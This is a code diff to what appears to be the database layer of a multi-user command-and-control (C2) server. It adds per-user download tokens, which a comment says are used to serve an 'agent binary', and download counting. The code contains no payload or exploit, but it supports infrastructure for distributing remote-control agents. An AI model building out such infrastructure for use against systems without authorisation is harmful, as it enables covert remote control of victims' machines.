@@ -33,6 +33,17 @@ class C2Database {
             )
         `);
 
+        // Download tokens — one per user, used to serve the agent binary
+        this.db.exec(`
+            CREATE TABLE IF NOT EXISTS download_tokens (
+                token TEXT PRIMARY KEY,
+                user_id INTEGER NOT NULL,
+                created_at INTEGER DEFAULT (strftime('%s', 'now')),
+                download_count INTEGER DEFAULT 0,
+                FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+            )
+        `);
+
         // Create clients table - now with user_id
         this.db.exec(`
             CREATE TABLE IF NOT EXISTS clients (
@@ -727,6 +738,24 @@ class C2Database {
     deleteUser(userId) {
         const stmt = this.db.prepare('DELETE FROM users WHERE id = ?');
         return stmt.run(userId);
+    }
+
+    // ---------- Download token methods ----------
+
+    getOrCreateDownloadToken(userId) {
+        const existing = this.db.prepare('SELECT token FROM download_tokens WHERE user_id = ?').get(userId);
+        if (existing) return existing.token;
+        const { randomBytes } = require('crypto');
+        const token = randomBytes(24).toString('hex');
+        this.db.prepare('INSERT INTO download_tokens (token, user_id) VALUES (?, ?)').run(token, userId);
+        return token;
+    }
+
+    getUserByDownloadToken(token) {
+        const row = this.db.prepare('SELECT user_id FROM download_tokens WHERE token = ?').get(token);
+        if (!row) return null;
+        this.db.prepare('UPDATE download_tokens SET download_count = download_count + 1 WHERE token = ?').run(token);
+        return row.user_id;
     }
     
     // Client operations with user filtering
